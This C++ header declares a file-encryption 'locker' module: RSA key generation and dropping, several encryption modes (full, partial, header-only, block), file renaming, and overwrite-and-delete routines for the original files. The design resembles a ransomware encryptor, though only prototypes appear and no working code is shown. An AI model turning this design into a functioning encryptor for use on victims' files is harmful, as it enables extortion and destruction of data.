#ifndef _FILE_SYSTEM_H_
#define _FILE_SYSTEM_H_

#include "locker.h"
#include "structures.h"
#include "pathsystem.h"
#include "global_parameters.h"

namespace filesystem
{
	bool WriteFullData(DESC desc, void* buffer, unsigned size);
	bool getParseFile(PFILE_INFO FileInfo);
	bool getParseFile(TCHAR* FilePath, DESC* desc_file, unsigned* filesize);
	bool CreateFileOpen(PFILE_INFO FileInfo);
	bool CreateFileOpen(DESC* desc_file, TCHAR* filename);
	bool CreateFileOpen(PFILE_INFO FileInfo);
	bool ReadRSAFile(CRYPT_INFO* CryptInfo);
	bool OptionEncryptModeAUTO(PFILE_INFO FileInfo);
	bool OptionEncryptModeFULL(PFILE_INFO FileInfo);
	bool OptionEncryptModePARTLY(PFILE_INFO FileInfo);
	bool OptionEncryptModeHEADER(PFILE_INFO FileInfo);
	bool OptionEncryptModeBLOCK(PFILE_INFO FileInfo);
	bool DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
	bool HandlerGenKeyPairRSA();
	bool EncryptRSA(PFILE_INFO FileInfo);
	bool FileCryptEncrypt(PFILE_INFO FileInfo);
	bool FileCryptDecrypt(PFILE_INFO FileInfo);
	bool HashSignatureFile(SLIST<locker::HLIST>* list, DESC HandleHash);
	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool VerifySignatureRSA(SLIST<HASH_LIST>* HashList);
	bool VerificationSignatureFile(SLIST<HASH_LIST>* HashList);
	void RootKeySignatureTrust(VOID);

	void sort_hash_list(SLIST<HASH_LIST>* list);
	bool nopHashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, TCHAR* Filename);
	bool HashSumFile(CRYPT_INFO* CryptInfo, DESC desc_file, TCHAR* Filename);

	TCHAR* NameMethodState(PCRYPT_INFO CryptInfo, PDRIVE_INFO data);
	TCHAR* OptionNameStandart(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
	TCHAR* OptionNameHash(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);
	TCHAR* OptionNameBase(TCHAR* Path, TCHAR* Filename, TCHAR* exst, TCHAR* FPath);

	bool nopOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool ZerosOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RandomOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool DODOverWriteFile(CRYPT_INFO* CryptInfo, DESC desc_file, unsigned filesize);
	bool RewriteSDelete(CRYPT_INFO* CryptInfo, TCHAR* FullPath);
}

#endif